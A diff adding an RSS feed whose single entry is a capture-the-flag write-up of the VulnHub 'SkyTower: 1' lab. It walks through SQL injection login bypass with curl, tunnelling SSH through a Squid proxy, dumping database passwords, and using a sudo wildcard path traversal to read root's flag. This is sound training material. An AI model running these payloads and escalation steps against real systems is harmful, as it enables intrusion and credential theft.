@@ -1,0 +1,237 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Skytower on Cheesy Rumbles</title>
+    <link>http://rastamouse.me/categories/skytower/</link>
+    <description>Recent content in Skytower on Cheesy Rumbles</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 29 Jun 2014 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://rastamouse.me/categories/skytower/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>SkyTower: 1</title>
+      <link>http://rastamouse.me/writeups/2014/skytower-1/</link>
+      <pubDate>Sun, 29 Jun 2014 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2014/skytower-1/</guid>
+      <description>
+
+&lt;p&gt;SkyTower is a boot2root challenge hosted at VulnHub.  The goal is to reach /root/flag.txt.&lt;/p&gt;
+
+&lt;h2 id=&#34;nmap:9b0fe4d66100ab98a2421f7d860ef8e6&#34;&gt;Nmap&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sV -A -p- 192.168.127.128
+
+PORT     STATE    SERVICE    VERSION
+22/tcp   filtered ssh
+80/tcp   open     http       Apache httpd 2.2.22 ((Debian))
+|_http-title: Site doesn&#39;t have a title (text/html).
+3128/tcp open     http-proxy Squid http proxy 3.1.20
+|_http-methods: No Allow or Public header in OPTIONS response (status code 400)
+|_http-title: ERROR: The requested URL could not be retrieved
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;skytower-login:9b0fe4d66100ab98a2421f7d860ef8e6&#34;&gt;SkyTower Login&lt;/h2&gt;
+
+&lt;p&gt;I punched the IP into Iceweasel and was greeted with a login screen.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/skytower-1/login.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;The post data of login.php looks like &lt;code&gt;email=&amp;amp;password=&lt;/code&gt;.  Instead of using the browser, I elected to attempt some injection with cURL.  First, a simple test with username and password as x.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl http://192.168.127.128/login.php --data &amp;quot;email=x&amp;amp;password=x&amp;quot;
+&amp;lt;br&amp;gt;Login Failed&amp;lt;/br&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After inserting an apostrophe into the email field, I received this error:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl http://192.168.127.128/login.php --data &amp;quot;email=&#39;&amp;amp;password=&amp;quot;
+There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;&#39;&#39; and password=&#39;&#39;&#39; at line 1]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I tried various authentication bypass injections:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl http://192.168.127.128/login.php --data &amp;quot;email=&#39;&amp;amp;password=&#39; or &#39;1&#39;=&#39;1&amp;quot;
+There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;1&#39;&#39;1&#39;&#39; at line 1]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This is a rather curious error message - it appears as though &amp;lsquo;or&amp;rsquo; has been filtered out of my request.  I spent a bunch of time looking at SQLi filter evasion and possible wildcard inclusion.  I finally found the following injection worked:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl http://192.168.127.128/login.php --data &amp;quot;email=&#39;*&#39;&amp;amp;password=&#39;*&#39;&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;For clarity, the result of that injection is screenshot below.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/skytower-1/john.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;$2 retirement fund&amp;hellip; a bit stingy to say the least&amp;hellip;&lt;/p&gt;
+
+&lt;h2 id=&#34;secure-shell:9b0fe4d66100ab98a2421f7d860ef8e6&#34;&gt;Secure Shell&lt;/h2&gt;
+
+&lt;p&gt;This message is very useful, in that it flat out tells us to SSH into the box and even provides a username and password.  However, if we recall the Nmap scan port 22 was filtered, but there is a Squid proxy running.  I used proxytunnel to establish a connection to port 22.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# proxytunnel -p 192.168.127.128:3128 -d 127.0.0.1:22 -a 2222
+root@kali:~# ssh john@127.0.0.1 -p 2222
+john@127.0.0.1&#39;s password: 
+Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64
+ 
+Funds have been withdrawn
+Connection to 127.0.0.1 closed.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So I was able to login, but was instantly kicked.  There were several ways to get around this.  The first is to modify the users&amp;rsquo; &lt;code&gt;.bashrc&lt;/code&gt; file:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ssh john @ 127.0.0.1 -p 2222 &amp;quot;cat /home/john/.bashrc&amp;quot;
+ 
+echo
+echo  &amp;quot;Funds have been withdrawn&amp;quot;
+exit
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ssh john @ 127.0.0.1 -p 2222 &amp;quot;sed -i &#39;/exit/s/^/#/&#39; /home/john/.bashrc&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The second is simply to execute another instance of &lt;code&gt;sh&lt;/code&gt; or &lt;code&gt;bash&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ssh john @ 127.0.0.1 -p 2222 &amp;quot;/bin/bash&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In anycase, I now have a shell.  John doesn&amp;rsquo;t have sudo rights but he does have the permissions to read the &lt;code&gt;login.php&lt;/code&gt; file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;john@SkyTower:~$ cat /var/www/login.php 
+$db = new mysqli(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;, &#39;SkyTech&#39;);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It&amp;rsquo;s also interesting to see the SQLi filtering which was going on:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$sqlinjection = array(&amp;quot;SELECT&amp;quot;, &amp;quot;TRUE&amp;quot;, &amp;quot;FALSE&amp;quot;, &amp;quot;--&amp;quot;,&amp;quot;OR&amp;quot;, &amp;quot;=&amp;quot;, &amp;quot;,&amp;quot;, &amp;quot;AND&amp;quot;, &amp;quot;NOT&amp;quot;);
+$email = str_ireplace($sqlinjection, &amp;quot;&amp;quot;, $_POST[&#39;email&#39;]);
+$password = str_ireplace($sqlinjection, &amp;quot;&amp;quot;, $_POST[&#39;password&#39;]);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;mysql:9b0fe4d66100ab98a2421f7d860ef8e6&#34;&gt;MySQL&lt;/h2&gt;
+
+&lt;p&gt;With these credentials, I was able to log in and explore the SQL database and extract the passwords of two other users.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;john@SkyTower:~$ mysql -uroot -proot
+ 
+mysql&amp;gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| SkyTech            |
+| mysql              |
+| performance_schema |
++--------------------+
+ 
+mysql&amp;gt; use SkyTech
+ 
+mysql&amp;gt; show tables;
++-------------------+
+| Tables_in_SkyTech |
++-------------------+
+| login             |
++-------------------+
+ 
+mysql&amp;gt; select * from login;
++----+----------------------+--------------+
+| id | email                | password     |
++----+----------------------+--------------+
+|  1 | john @skytech.com    | hereisjohn   |
+|  2 | sara @skytech.com    | ihatethisjob |
+|  3 | william @skytech.com | senseable    |
++----+---------------------+---------------+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I SSH&amp;rsquo;d in as Sara (after fixing the &lt;code&gt;.bashrc&lt;/code&gt; file as before) and found that she has some sudo rights.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;sara@SkyTower:~$ sudo -l
+ 
+User sara may run the following commands on this host:
+    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The wildcard in these allowances are actually vulnerable to a directory traversal type effect.&lt;/p&gt;
+
+&lt;h2 id=&#34;root:9b0fe4d66100ab98a2421f7d860ef8e6&#34;&gt;Root&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;sara@SkyTower:~$ sudo /bin/ls /accounts/../root/
+flag.txt
+ 
+sara@SkyTower:~$ sudo /bin/cat /accounts/../root/flag.txt
+Congratz, have a cold one to celebrate!
+root password is theskytower
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Even though I had root access, I wanted to explore William&amp;rsquo;s account.  The password within the SkyTech database was incorrect for the user, so I cracked the real password by obtaining the shadow file.  William&amp;rsquo;s real password is &lt;code&gt;sensable&lt;/code&gt;, not &lt;code&gt;senseable&lt;/code&gt; - not sure if this is a typo in the database or intentional.  Either way, I didn&amp;rsquo;t find anything interesting within his user space.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
